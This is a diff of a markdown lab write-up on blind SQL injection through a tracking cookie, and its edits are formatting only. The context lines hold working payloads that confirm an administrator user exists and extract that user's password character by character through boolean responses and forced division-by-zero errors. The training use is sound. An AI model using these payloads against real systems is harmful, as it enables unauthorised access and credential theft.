@@ -120,17 +120,17 @@ If we just send this message, we get a *Welcome Back* message.
 
 To see if the cookie is vulnerable to SQL Injections, we try a few small things:\
 `Cookie: TrackingId=4qq9peoK98lxFHKV'; session=xxxxxxx`\
-    No *Welcome Back* message\
+* No *Welcome Back* message\
 `Cookie: TrackingId=4qq9peoK98lxFHKV' OR '1'='1; session=xxxxxxx`\
-    *Welcome Back* message\
+* *Welcome Back* message\
 `Cookie: TrackingId=4qq9peoK98lxFHKV' AND '1'='2; session=xxxxxxx`\
-    No *Welcome Back* message\
+* No *Welcome Back* message\
 `Cookie: TrackingId=' OR 1=1 OR '1'='2; session=xxxxxxx`\
-    *Welcome Back* message (This one is important because now we don't have to worry about the TrackingId itself, and the quotes in the *1=1* middle part.)
+* *Welcome Back* message (This one is important because now we don't have to worry about the TrackingId itself, and the quotes in the *1=1* middle part.)
 
 Let's see if there's a *users* table, and an *administrator* account:\
 `Cookie: TrackingId=' OR (SELECT COUNT(Table_Name) FROM information_schema.tables WHERE Table_Name='users')=1 OR '1'='2; session=xxxxxxx`\
-    *Welcome Back* message, so the *users* table exists.
+    *Welcome Back* message, so the *users* table exists.\
 `Cookie: TrackingId=' OR (SELECT COUNT(username) FROM users WHERE username='administrator')=1 OR '1'='2; session=xxxxxxx`\
     *Welcome Back* message, so the *administrator* user exists, and the column name is just *username*.
 
@@ -164,7 +164,7 @@ Carry on with the 2nd character:\
 And the 3rd, 4th... 20th. To get the full password of the administrator. And use it to login.
 
 
-## Blind SQL injection with conditional errors
+## LAB : Blind SQL injection with conditional errors
 
 Same as previous lab, the cookie is vulnerable. Intercept the request in burp, send it to repeater, and try some small things with the cookie to see what works:\
 `Cookie: TrackingId=abKX6i4aODjyEqti; session=xxxxxxx`\
@@ -198,7 +198,7 @@ On to the password:\
     First one gives *500*, second one gives *200*. Which is when we want. So when our result is correct, it tries to return the character of the numeric value of (1/0). And dividing by zero gives an error.\
 `Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
     200 => Password length is not 1.\
-...
+...\
 `Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
     500 => Password length is again 20.
 
